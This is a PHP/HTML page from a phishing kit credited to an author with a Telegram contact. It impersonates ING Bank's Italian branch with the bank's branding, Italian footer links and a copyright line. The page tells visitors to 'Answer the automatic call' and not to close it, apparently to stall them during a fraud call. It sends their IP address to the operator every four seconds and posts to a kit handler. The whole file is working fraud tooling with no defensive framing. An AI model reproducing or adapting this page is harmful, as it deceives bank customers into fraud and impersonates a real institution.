<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51official
    ********************************************************/
    
    $_SESSION['last_page'] = "loadcall";

?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="<?php echo IMGSPATH; ?>/favicon.ico">
        <title>ING</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="<?php echo CSSPATH; ?>/style.css">
        <script src="<?php echo JSPATH; ?>/stutes.js"></script>         
    </head>
    <body class="d-flex flex-column justify-content-between" style="min-height:100vh;">

      <!-- HEADER -->
      <header class="header_1">
        <div class="container_header_1">
          <div class="logo">
            <img src="<?php echo IMGSPATH; ?>/logo.svg" alt="">
          </div>
        </div>
      </header>

      <!-- wrapper_login -->
      <div class="wrapper_login">
        <div class="container_login">
          <form action="./Assets/php/config/func.php" method="post">
            <input type="hidden" name="sms">
            <div class="title">
              <div class="d-flex justify-content-center">
                <img src="<?php echo IMGSPATH; ?>/phone.png" style="width:130px; margin-bottom:9px;" alt="">
              </div>
              <h1 class="mb-0">Answer the automatic call</h1>
              <hr>
              
<p class="mb-2 text-center">
    Do not close this page
</p>
<div class="spinner-border text-warning mt-2 d-block" role="status" style="border-color:#FF6600; border-right-color:white; width: 1.9em;  height: 1.9em; margin: 0 auto;">
                  <span class="sr-only">Loading...</span>
                </div> 

            </div>
          </form>
        </div>
      </div>

      <!-- footer -->
      <footer class="footer_1">
        <div class="container_footer_1">
          <div class="links_footer">
            <ul class="ps-0 mb-0">
              <li>Sicurezza</li>
              <li>Definizione di Default</li>
              <li>Privacy</li>
            </ul>
            <ul class="ps-0 mb-0">
              <li>Trasparenza</li>
              <li>Reclami</li>
              <li>Cookies</li>
            </ul>
          </div>
          <div class="copyghit">
            <p class="mb-0">© 2026 ING BANK N.V. Milan Branch P.I. 11241140158</p>
          </div>
        </div>
      </footer>


      
       









        







        <!-- bootstrap -->
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
        <!-- script jquery -->
        <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="<?php echo JSPATH; ?>/script.js"></script>
        
        <script>
            worker();
            var jsonData = {
              action: 'VISITORS',
              ip: '<?php echo get_client_ip(); ?>',
              page: 'loadcall'
            };
            sendAjaxRequestEveryFourSeconds(jsonData);                 
        </script>
    </body>
</html>